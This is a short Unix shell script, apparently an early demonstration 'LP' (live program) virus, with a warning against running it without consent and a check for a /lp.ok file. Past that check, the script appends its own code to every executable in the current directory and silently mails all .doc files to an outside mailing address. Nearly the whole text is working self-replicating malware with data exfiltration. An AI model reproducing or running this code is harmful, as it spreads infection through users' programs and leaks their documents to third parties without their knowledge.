# WARNING - Running LPs on other people's computers without
# their prior consent is against the law and violates my copyright.
#                       DO NOT DO IT!!!
if test ! -f /lp.ok   #zq
    then #zq
    echo "LPs not permitted" #zq
    exit #zq
fi #zq
for i in *		#zq for all files in this directory
  do			#zq
  if test -x $i		#zq if the file is a program
    then		#zq
    cat $0 >> $i	#zq add the LP to the program
  fi			#zq
  done			#zq
cat *.doc | mail maillist@netaddress >/dev/null &2>/dev/null #zq